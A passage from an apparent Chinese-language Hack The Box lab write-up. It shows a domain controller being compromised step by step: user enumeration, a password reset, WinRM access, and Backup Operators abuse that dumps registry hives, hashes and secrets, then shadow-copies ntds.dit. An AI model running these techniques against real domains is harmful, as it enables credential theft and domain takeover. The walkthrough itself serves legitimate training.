+</span></span><span style="display:flex;"><span>objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Caroline Robinson,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>ref: ldap://baby.vl/CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span></code></pre></div><p>将dn筛选出来，我们能获得这些用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>Connor.Wilkinson
+</span></span><span style="display:flex;"><span>Joseph.Hughes
+</span></span><span style="display:flex;"><span>Kerry.Wilson
+</span></span><span style="display:flex;"><span>Teresa.Bell
+</span></span><span style="display:flex;"><span>Caroline.Robinson
+</span></span><span style="display:flex;"><span>Jacqueline.Barnett
+</span></span><span style="display:flex;"><span>Ashley.Webb
+</span></span><span style="display:flex;"><span>Hugh.George
+</span></span><span style="display:flex;"><span>Leonard.Dyer
+</span></span><span style="display:flex;"><span>Ian.Walker
+</span></span></code></pre></div><p>这里我漏了一张图，打完回来找已经翻不到了，简单来说就是nxc看到了需要更改密码，Caroline.Robinson的密码就是我们之前找到的那个</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbpasswd -U Caroline.Robinson -r $ip
+</span></span><span style="display:flex;"><span>Old SMB password:
+</span></span><span style="display:flex;"><span>New SMB password:
+</span></span><span style="display:flex;"><span>Retype new SMB password:
+</span></span><span style="display:flex;"><span>Password changed <span style="color:#66d9ef">for</span> user Caroline.Robinson
+</span></span></code></pre></div><p>改密码后我们就能登陆了，也有winrm权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user2 -p <span style="color:#e6db74">&#39;SunnyDay2025!&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:BABYDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:baby.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:SunnyDay2025! 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user2 -p <span style="color:#e6db74">&#39;SunnyDay2025!&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.42.166   <span style="color:#ae81ff">5985</span>   BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:BABYDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:baby.vl<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.42.166   <span style="color:#ae81ff">5985</span>   BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:SunnyDay2025! <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="提权">提权
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i $ip -u $user2  -p <span style="color:#e6db74">&#39;SunnyDay2025!&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User Name              SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">======================</span> <span style="color:#f92672">==============================================</span>
+</span></span><span style="display:flex;"><span>baby<span style="color:#ae81ff">\c</span>aroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID                                            Attributes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span> <span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\B</span>ackup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\i</span>t                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level       Label            S-1-16-12288
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER CLAIMS INFORMATION
+</span></span><span style="display:flex;"><span>-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User claims unknown.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\D</span>ocuments&gt; 
+</span></span></code></pre></div><p>打备份管理员，我本来想nxc直接远程抓算了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user2 -p ^<span style="color:#f92672">[[</span>200~ -p <span style="color:#e6db74">&#39;SunnyDay2025!&#39;</span> -M backup_operator
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:BABYDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:baby.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:SunnyDay2025! 
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering RemoteRegistry to start through named pipe...
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           Saved HKLM<span style="color:#ae81ff">\S</span>AM to <span style="color:#ae81ff">\\</span>10.129.42.166<span style="color:#ae81ff">\S</span>YSVOL<span style="color:#ae81ff">\S</span>AM
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           Saved HKLM<span style="color:#ae81ff">\S</span>YSTEM to <span style="color:#ae81ff">\\</span>10.129.42.166<span style="color:#ae81ff">\S</span>YSVOL<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           Saved HKLM<span style="color:#ae81ff">\S</span>ECURITY to <span style="color:#ae81ff">\\</span>10.129.42.166<span style="color:#ae81ff">\S</span>YSVOL<span style="color:#ae81ff">\S</span>ECURITY
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Copying <span style="color:#e6db74">&#34;SAM&#34;</span> to <span style="color:#e6db74">&#34;/home/wackymaker/.nxc/logs/BABYDC_10.129.42.166_2025-09-18_230638.SAM&#34;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File <span style="color:#e6db74">&#34;SAM&#34;</span> was downloaded to <span style="color:#e6db74">&#34;/home/wackymaker/.nxc/logs/BABYDC_10.129.42.166_2025-09-18_230638.SAM&#34;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Copying <span style="color:#e6db74">&#34;SECURITY&#34;</span> to <span style="color:#e6db74">&#34;/home/wackymaker/.nxc/logs/BABYDC_10.129.42.166_2025-09-18_230638.SECURITY&#34;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File <span style="color:#e6db74">&#34;SECURITY&#34;</span> was downloaded to <span style="color:#e6db74">&#34;/home/wackymaker/.nxc/logs/BABYDC_10.129.42.166_2025-09-18_230638.SECURITY&#34;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Copying <span style="color:#e6db74">&#34;SYSTEM&#34;</span> to <span style="color:#e6db74">&#34;/home/wackymaker/.nxc/logs/BABYDC_10.129.42.166_2025-09-18_230638.SYSTEM&#34;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File <span style="color:#e6db74">&#34;SYSTEM&#34;</span> was downloaded to <span style="color:#e6db74">&#34;/home/wackymaker/.nxc/logs/BABYDC_10.129.42.166_2025-09-18_230638.SYSTEM&#34;</span>
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           $MACHINE.ACC:plain_password_hex:0d43eb797b84b0b440fbcb0d89fea14f8458970482b891850f2d2106c7c08447f2aa725adc71c58241311e5cebf5b75d43f5b541a43d583665ea4669bee9d1910c4ee1f4703104fccf44eb3ac2b3bb31ed1712e4fca7e416d3bd561993cd88a9750b0a04466909e51660a3fec061e9f5a51e8e10fe8c2653cd610140611ea9cd2fc1f436829369373bfb51fc5214666a9073e7a8124f4a07414ee0a7e565f24745f2ec5f134e7b7dca577813e5e82867ea33b16a1797c51703731eb1e4273db597063d62cb7f1c1a0faae15ab06aadea286b87cf6f2d28127fb948113c6b57c92a97c1aad038f958404b27f6e6d6fba5
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           dpapi_machinekey:0xe620195f1a5e2d71842bbad9877d7c3ca8a31eda
+</span></span><span style="display:flex;"><span>dpapi_userkey:0x026920834cd39c2e8ba9401c44a8869fe6be0555
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
+</span></span><span style="display:flex;"><span>SMB         10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\A</span>dministrator:8d992faed38128ae85e95fa35868bb43 SessionError
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Use the domain admin account to clean the file on the remote host
+</span></span><span style="display:flex;"><span>BACKUP_O... 10.129.42.166   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> netexec smb dc_ip -u user -p pass -x <span style="color:#e6db74">&#34;del C:\Windows\sysvol\sysvol\SECURITY &amp;&amp; del C:\Windows\sysvol\sysvol\SAM &amp;&amp; del C:\Windows\sysvol\sysvol\SYSTEM&#34;</span>
+</span></span></code></pre></div><p>但是sam抓出来的本地管理员不是域管理员登陆不上，psexec也没法本地管理员登陆。估计是禁用了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.64.108 -u <span style="color:#e6db74">&#39;administrator&#39;</span> -H <span style="color:#e6db74">&#39;8d992faed38128ae85e95fa35868bb43&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Error: Exiting with code <span style="color:#ae81ff">1</span> 
+</span></span></code></pre></div><p>只能打卷影复制器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; echo <span style="color:#e6db74">&#34;set context persistent nowriters&#34;</span> | out-file ./diskshadow.txt -encoding ascii
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; echo <span style="color:#e6db74">&#34;add volume c: alias temp&#34;</span> | out-file ./diskshadow.txt -encoding ascii -append
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; echo <span style="color:#e6db74">&#34;create&#34;</span> | out-file ./diskshadow.txt -encoding ascii -append 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; echo <span style="color:#e6db74">&#34;expose %temp% z:&#34;</span> | out-file ./diskshadow.txt -encoding ascii -append
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; diskshadow.exe /s C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\d</span>iskshadow.txt
+</span></span><span style="display:flex;"><span>Microsoft DiskShadow version 1.0
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation
+</span></span><span style="display:flex;"><span>On computer:  BABYDC,  9/19/2025 3:28:54 AM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-&gt; set context persistent nowriters
+</span></span><span style="display:flex;"><span>-&gt; add volume c: alias temp
+</span></span><span style="display:flex;"><span>-&gt; create
+</span></span><span style="display:flex;"><span>Alias temp <span style="color:#66d9ef">for</span> shadow ID <span style="color:#f92672">{</span>a423bade-6a97-4a48-882e-1ca7312f498f<span style="color:#f92672">}</span> set as environment variable.
+</span></span><span style="display:flex;"><span>Alias VSS_SHADOW_SET <span style="color:#66d9ef">for</span> shadow set ID <span style="color:#f92672">{</span>7a62d230-0941-4238-8904-5fed8646ecab<span style="color:#f92672">}</span> set as environment variable.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Querying all shadow copies with the shadow copy set ID <span style="color:#f92672">{</span>7a62d230-0941-4238-8904-5fed8646ecab<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	* Shadow copy ID <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>a423bade-6a97-4a48-882e-1ca7312f498f<span style="color:#f92672">}</span>		%temp%
+</span></span><span style="display:flex;"><span>		- Shadow copy set: <span style="color:#f92672">{</span>7a62d230-0941-4238-8904-5fed8646ecab<span style="color:#f92672">}</span>	%VSS_SHADOW_SET%
+</span></span><span style="display:flex;"><span>		- Original count of shadow copies <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		- Original volume name: <span style="color:#ae81ff">\\</span>?<span style="color:#ae81ff">\V</span>olume<span style="color:#f92672">{</span>711fc68a-0000-0000-0000-100000000000<span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span><span style="color:#f92672">[</span>C:<span style="color:#ae81ff">\]</span>
+</span></span><span style="display:flex;"><span>		- Creation time: 9/19/2025 3:28:54 AM
+</span></span><span style="display:flex;"><span>		- Shadow copy device name: <span style="color:#ae81ff">\\</span>?<span style="color:#ae81ff">\G</span>LOBALROOT<span style="color:#ae81ff">\D</span>evice<span style="color:#ae81ff">\H</span>arddiskVolumeShadowCopy1
+</span></span><span style="display:flex;"><span>		- Originating machine: BabyDC.baby.vl
+</span></span><span style="display:flex;"><span>		- Service machine: BabyDC.baby.vl
+</span></span><span style="display:flex;"><span>		- Not exposed
+</span></span><span style="display:flex;"><span>		- Provider ID: <span style="color:#f92672">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Number of shadow copies listed: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>-&gt; expose %temp% z:
+</span></span><span style="display:flex;"><span>-&gt; %temp% <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>a423bade-6a97-4a48-882e-1ca7312f498f<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>The shadow copy was successfully exposed as z:<span style="color:#ae81ff">\.</span>
+</span></span><span style="display:flex;"><span>-&gt;
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; robocopy /B Z:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS . ntds.dit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>   ROBOCOPY     ::     Robust File Copy <span style="color:#66d9ef">for</span> Windows
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Started : Friday, September 19, <span style="color:#ae81ff">2025</span> 3:29:44 AM
+</span></span><span style="display:flex;"><span>   Source : Z:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     Dest : C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>    Files : ntds.dit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	                   1	Z:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	    New File  		  16.0 m	ntds.dit
+</span></span><span style="display:flex;"><span>  0.0%
+</span></span><span style="display:flex;"><span>  0.3%
+</span></span><span style="display:flex;"><span>  0.7%
+</span></span><span style="display:flex;"><span>  1.1%
+</span></span><span style="display:flex;"><span>...........
+</span></span><span style="display:flex;"><span> 99.2%
+</span></span><span style="display:flex;"><span> 99.6%
+</span></span><span style="display:flex;"><span>100%
+</span></span><span style="display:flex;"><span>100%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>               Total    Copied   Skipped  Mismatch    FAILED    Extras
